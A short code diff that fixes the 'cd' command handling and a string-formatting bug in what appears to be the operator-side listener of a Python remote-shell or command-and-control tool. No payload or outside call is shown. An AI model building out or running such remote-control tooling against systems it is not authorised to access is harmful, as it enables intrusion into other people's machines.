@@ -240,7 +240,7 @@ def get_pwd(conn,mode='print'):
         pass
 
 def change_working_dir(conn, path):
-    send_data(conn, "[cwd] path")
+    send_data(conn, "[cwd] {}".format(path))
     get_pwd(conn,mode='print')
 
 def listen():
@@ -404,8 +404,8 @@ def listen():
                             command = ""
                         elif command == "back" or command == "exit" or command == "quit":
                             cmd = ""
-                        elif command.startswith("cd ")
-                            change_working_dir(command.lstrip("cd "))
+                        elif command.startswith("cd "):
+                            change_working_dir(conn,command.lstrip("cd "))
                         elif command == "":
                             pass
                         else:
